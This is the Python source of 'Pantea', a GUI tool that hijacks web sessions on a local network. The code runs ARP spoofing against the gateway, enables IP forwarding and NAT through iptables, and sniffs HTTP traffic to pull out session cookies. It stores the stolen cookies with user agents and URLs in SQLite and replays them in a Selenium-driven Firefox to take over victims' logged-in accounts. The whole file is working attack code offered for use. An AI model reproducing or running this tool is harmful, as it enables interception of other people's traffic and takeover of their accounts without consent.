#!/usr/bin/env python
# -*- coding: utf-8 *-*
#
# Pantea v1.0
# Nima Ghotbi
# http://nima.cu.cc

#CONFIGS START
CONFIG_SOUNDPLAYER_CMD = "aplay -q [FILE]"
#CONFIGS END

import thread
import os
import sqlite3
import socket
import time
from struct import pack
from selenium import webdriver
import gtk
import gobject
import multiprocessing
import imp
import pcapy
import Queue
from lib.util import set_db_connection


HOST = {}
COOKIE_CHECKSUM = {}
COOKIE_IN_PROGRESS = {}
STOP_SIGNAL = False
ARP_SPOOF = True
FORWARD = True
ALERT = False
DATA_POOL = Queue.Queue()
DEVICE = ""


class GUI (object):
    def __init__(self):
        self.builder = gtk.Builder()
        self.builder.add_from_file("data/gui.glade")
        self.builder.connect_signals(self)
        self.t = None

    def run(self):
        self.builder.get_object("window1").show_all()
        gobject.timeout_add(500, self.update_view)
        gtk.main()

    def on_window1_destroy(self, *args):
        try:
            self.t.terminate()
        except:
            pass
        gtk.main_quit()

    def on_checkbutton1_toggled(self, *args):
        global ARP_SPOOF
        ARP_SPOOF = not ARP_SPOOF

    def on_checkbutton2_toggled(self, *args):
        global FORWARD, DEVICE
        FORWARD = not FORWARD
        if FORWARD is False:
            disable_forward()
        else:
            enable_forward()

    def on_checkbutton3_toggled(self, *args):
        global ALERT
        ALERT = not ALERT

    def on_button1_clicked(self, *args):
        global STOP_SIGNAL
        button = self.builder.get_object("button1")
        spinner = self.builder.get_object("spinner1")
        checkbox1 = self.builder.get_object("checkbutton1")
        if button.get_label() == "Start":
            STOP_SIGNAL = False
            button.set_label("Stop")
            checkbox1.set_sensitive(False)
            spinner.set_visible(True)
            spinner.start()
            self.t = multiprocessing.Process(target=main, args=())
            self.t.start()
        else:
            STOP_SIGNAL = True
            button.set_label("Start")
            checkbox1.set_sensitive(True)
            spinner.set_visible(False)
            spinner.stop()
            self.t.terminate()

    def on_button3_clicked(self, *args):
        global con, COOKIE_CHECKSUM
        with con:
            cur = con.cursor()
            cur.execute("delete from dump")
        for h in COOKIE_CHECKSUM:
            COOKIE_CHECKSUM[h] = []
        run("rm -f temp/*")

    def on_select(self, *args):
        global con
        with con:
            cur = con.cursor()
            cur.execute("select * from dump")
            rows = cur.fetchall()
            (cookie, angent, photo, info, url) = \
            rows[args[0].get_selected_items()[0][0]]
        thread.start_new_thread(browse, (url, cookie, angent))

    def update_view(self):
        global con
        iv = self.builder.get_object("iconview1")
        model = gtk.ListStore(str, gtk.gdk.Pixbuf)
        with con:
            cur = con.cursor()
            cur.execute("select * from dump")
            rows = cur.fetchall()
        for (cookie, angent, photo, info, url) in rows:
            try:
                pixbuf = gtk.gdk.pixbuf_new_from_file(photo)
                model.append([info, pixbuf])
            except:
                pass
        iv.set_model(model)
        iv.set_text_column(0)
        iv.set_pixbuf_column(1)
        iv.set_orientation(gtk.ORIENTATION_VERTICAL)
        iv.set_selection_mode(gtk.SELECTION_SINGLE)
        iv.set_columns(1)
        iv.set_item_width(-1)
        iv.set_size_request(72, -1)
        self.builder.get_object("window1").show_all()
        return True


def run(cmd):
    return os.popen(cmd).read()


def browse(url, cookie, ua):
    domain = ".".join(url.split("/")[2].split(".")[-2:])
    cookies = cookie_dict(cookie, domain)
    profile = webdriver.FirefoxProfile()
    profile.set_preference("general.useragent.override", ua)
    browser = webdriver.Firefox(profile)
    browser.get(url)
    browser.delete_all_cookies()
    for c in cookies:
        try:
            browser.add_cookie(c)
        except:
            pass
    browser.get(url)


def cookie_dict(cook, domain):
    cookies = []
    for c in cook.split("; "):
        tmp = c.split("=", 1)
        if len(tmp) == 2:
            cookies.append({"name": tmp[0], "value": tmp[1],
            "domain": domain})
            cookies.append({"name": tmp[0], "value": tmp[1],
            "domain": "." + domain})
        else:
            cookies.append({"name": tmp[0], "value": ""})
            cookies.append({"name": tmp[0], "value": "",
            "domain": "." + domain})
    return cookies


def get_gateway_IP():
    try:
        output = run("route -n").split("\n")[1:]
        for l in output:
            if not l.startswith("0.0.0.0"):
                continue
            ip = l.split()[1]
            socket.inet_aton(ip)
            dev = l.split()[7]
            return (ip, dev)
    except:
        return None


def enable_forward():
    global DEVICE
    f = open("/proc/sys/net/ipv4/ip_forward", "w")
    f.write('1')
    f.close()
    f = open("/proc/sys/net/ipv4/conf/" + DEVICE + "/send_redirects", "w")
    f.write('0')
    f.close()
    run("iptables -t nat -F")
    run("iptables -F")
    run("iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE")
    run("iptables -P FORWARD ACCEPT")
    print "Forwarding Enabled."


def disable_forward():
    global DEVICE
    f = open("/proc/sys/net/ipv4/ip_forward", "w")
    f.write('0')
    f.close()
    f = open("/proc/sys/net/ipv4/conf/" + DEVICE + "/send_redirects", "w")
    f.write('1')
    f.close()
    run("iptables -t nat -F")
    run("iptables -F")
    print "Forwarding Disabled."


def arp_spoof(rIP, dev):
    global STOP_SIGNAL
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    sock.bind((dev, socket.SOCK_RAW))

    bcast_mac = pack('!6B', *(0xFF,) * 6)
    socket_mac = sock.getsockname()[4]

    sender_ip = pack('!4B', *[int(x) for x in rIP.split('.')])
    target_ip = pack('!4B', *[int(x) for x in "255.255.255.255".split('.')])

    arpframe = [
        ### ETHERNET
        # MAC e hadaf
        bcast_mac,
        # MAC e mabda
        socket_mac,
        # ARP
        pack('!H', 0x0806),

        ### ARP
        pack('!HHBB', 0x0001, 0x0800, 0x0006, 0x0004),
        #Type
        pack('!H', 0x0002),
        # MAC e ferestande
        socket_mac,
        # IP e ferestande
        sender_ip,
        # MAC girande
        bcast_mac,
        # IP girande
        target_ip
        ]
    packet = ''.join(arpframe)
    while STOP_SIGNAL is False:
        sock.send(packet)
        time.sleep(0.2)


def sniff(dev):
    pc = pcapy.open_live(dev, 4096, True, 1000)
    pc.setfilter('dst port 80 and \
    ((tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420) or \
    ((tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)))')
    pc.loop(-1, lambda x, y: DATA_POOL.put(y))


def parse_thread():
    global STOP_SIGNAL
    while STOP_SIGNAL is False:
        data = DATA_POOL.get(True)
        thread.start_new_thread(check_packet_data, (data,))


def check_packet_data(data):
    if data.find("Cookie: ") == -1 or data.find("X-Anti-Pantea") != -1:
        return
    start = data.find("GET ")
    if start == -1:
        start = data.find("POST ")
    data = data[start:]
    #print "-" * 50
    #print data
    hTuple = [elm.split(": ", 1) for elm in data.split("\r\n\r\n",
    1)[0].split("\r\n")[1:]]
    headers = {}
    for elm in hTuple:
        if len(elm) < 2:
            #print "[Header Error]",
            #print elm
            continue
        headers[elm[0]] = elm[1]
    if "Host" not in headers:
        return
    for host in HOST:
        if headers["Host"].find(host) != -1:
            run_plugin(HOST[host], host, headers)
            return


def run_plugin(plug, key, headers):
    global COOKIE_CHECKSUM, COOKIE_IN_PROGRESS, ALERT, CONFIG_SOUNDPLAYER_CMD
    p = headers["Cookie"].find(plug[1])
    if p == -1:
        return
    s = headers["Cookie"][p + len(plug[1]):]
    s = s[:s.find("; ")]
    if s in COOKIE_IN_PROGRESS[key]:
        return
    COOKIE_IN_PROGRESS[key].append(s)
    if s in COOKIE_CHECKSUM[key]:
        return
    #print key
    if plug[0](headers) is True:
        COOKIE_CHECKSUM[key].append(s)
        if ALERT is True:
            run(CONFIG_SOUNDPLAYER_CMD)
    del COOKIE_IN_PROGRESS[key][COOKIE_IN_PROGRESS[key].index(s)]


def main():
    global ARP_SPOOF
    (ip, dev) = get_gateway_IP()
    print "Interface:", dev
    print "Gateway IP:", ip
    if ARP_SPOOF is True:
        print "Arp spoofing thread:",
        thread.start_new_thread(arp_spoof, (ip, dev))
        print "Started"
    thread.start_new_thread(parse_thread, ())
    sniff(dev)


def getPlugins(path):
    plugins = []
    possibleplugins = os.listdir(path)
    for i in possibleplugins:
        location = os.path.join(path, i)
        if not os.path.isdir(location) or not "__init__" + ".py" in \
        os.listdir(location):
            continue
        info = imp.find_module("__init__", [location])
        plugins.append({"name": i, "info": info})
    return plugins


def loadPlugin(plugin):
    return imp.load_module("__init__", *plugin["info"])


class PluginError(Exception):
    def __init__(self, value):
        self.value = value

    def __str__(self):
        return self.value

if __name__ == '__main__':
    gtk.gdk.threads_init()
    gobject.threads_init()
    if run("id -u")[:-1] != "0":
        md = gtk.MessageDialog(None,
        gtk.DIALOG_DESTROY_WITH_PARENT, gtk.MESSAGE_ERROR,
        gtk.BUTTONS_CLOSE, "Execute as root! (sudo pantea.py)")
        md.run()
        md.destroy()
    else:
        print "Loading plugins..."
        print "-" * 40
        for i in getPlugins("./plugins/"):
            print "{0: <25}".format(i["name"].capitalize()),
            try:
                plugin = loadPlugin(i)
                if plugin.__host in HOST or plugin.__host == "" or \
                plugin.__host is None:
                    raise PluginError("Bad __host!")
                if plugin.__sess == "" or plugin.__sess is None:
                    raise PluginError("Bad __sess!")
                for h in HOST:
                    if HOST[h][0] == plugin.parse:
                        raise PluginError("Define parse function")
                HOST[plugin.__host] = [plugin.parse, plugin.__sess]
                COOKIE_CHECKSUM[plugin.__host] = []
                COOKIE_IN_PROGRESS[plugin.__host] = []
                print "\t\033[92m[LOADED]\033[0m"
            except PluginError as e:
                print "\t\033[91m[FAILED]\033[0m ({0})".format(e)
        print "-" * 40
        print "\033[1m%i\033[0m plugins loaded." % len(HOST)
        print
        DEVICE = get_gateway_IP()[1]
        enable_forward()
        if not os.path.exists("./data/database.db"):
            con = sqlite3.connect("./data/database.db",
            check_same_thread=False)
            con.text_factory = str
            cur = con.cursor()
            cur.execute("CREATE TABLE dump (cookie text, agent text, \
            photo text, title text UNIQUE, url text)")
        else:
            con = sqlite3.connect("./data/database.db",
            check_same_thread=False)
            con.text_factory = str
        set_db_connection(con)
        CONFIG_SOUNDPLAYER_CMD = CONFIG_SOUNDPLAYER_CMD.replace("[FILE]",
        "data/alert.wav")
        GUI().run()
